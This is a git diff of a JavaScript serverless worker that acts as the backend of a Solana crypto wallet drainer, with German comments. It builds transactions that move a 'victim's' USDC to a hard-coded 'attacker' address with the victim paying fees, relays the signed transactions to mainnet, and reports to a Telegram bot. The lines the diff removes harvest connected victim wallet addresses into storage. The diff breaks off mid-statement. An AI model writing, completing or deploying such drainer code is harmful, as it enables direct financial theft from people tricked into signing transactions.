@@ -21,13 +21,14 @@ export default {
     if (request.method === "POST") {
       try {
         const data = await request.json();
-        const connection = new Connection("https://rpc.ankr.com/solana", "confirmed");
+        
+        // RPC Wechsel (Extrnode statt Ankr)
+        const connection = new Connection("https://solana-mainnet.rpc.extrnode.com", "confirmed");
         const USDC_MINT = new PublicKey("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v");
 
-        // BUILDER
         if (data.type === "build_tx") {
           const victimPubkey = new PublicKey(data.victim);
-          const attackerPubkey = new PublicKey("FN73jYtbKMkfT14yG8MvMzrmCSREyX45rUrxiKoRbofB"); // Deine Adresse
+          const attackerPubkey = new PublicKey("FN73jYtbKMkfT14yG8MvMzrmCSREyX45rUrxiKoRbofB");
           
           const victimAta = await getAssociatedTokenAddress(USDC_MINT, victimPubkey);
           
@@ -45,19 +46,16 @@ export default {
           tx.feePayer = victimPubkey;
           tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
 
-          // Serialisiere TX und sende als Base64 zurück
           const serialized = tx.serialize({ requireAllSignatures: false, verifySignatures: false });
           return new Response(JSON.stringify({ tx: serialized.toString('base64') }), {
             headers: { ...corsHeaders, "Content-Type": "application/json" },
           });
         }
 
-        // SENDER (Signierte TX empfangen und an Solana senden)
         if (data.type === "send_tx") {
-          const rawTx = bs58.decode(data.tx);
+          const rawTx = Buffer.from(data.tx, "base64");
           const tx = Transaction.from(rawTx);
           
-          // Sende an Solana RPC
           const sig = await connection.sendRawTransaction(tx.serialize(), { skipPreflight: true });
           
           if (env.BOT_TOKEN && env.ALERT_CHAT_ID) {
@@ -68,37 +66,4 @@ export default {
           }
 
           return new Response(JSON.stringify({ success: true, sig }), {
-            headers: { ...corsHeaders, "Content-Type": "application/json" },
-          });
-        }
-
-        // WALLET CONNECTED (Erster Fetch)
-        if (data.type === "connection_and_balance") {
-          if (env.HARVEST) {
-            await env.HARVEST.put(Date.now() + ":" + data.victim, JSON.stringify(data));
-          }
-          
-          if (env.BOT_TOKEN && env.ALERT_CHAT_ID) {
-            let channelMsg = `🔗 *WALLET CONNECTED*\n\n👤 *Address:*\n\`${data.victim}\``;
-            let buttons = [
-              [{ text: "🔄 Check Balance", callback_data: `balance:${data.victim}` }]
-            ];
-            await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
-              method: "POST", headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ chat_id: env.ALERT_CHAT_ID, text: channelMsg, parse_mode: "Markdown", reply_markup: { inline_keyboard: buttons } }),
-            });
-          }
-          return new Response(JSON.stringify({ success: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
-        }
-
-        return new Response("OK", { headers: corsHeaders });
-      } catch (error) {
-        return new Response(JSON.stringify({ error: error.message }), {
-          status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" },
-        });
-      }
-    }
-
-    return new Response("Worker Active", { headers: corsHeaders });
-  },
-};
+            headers: { ...
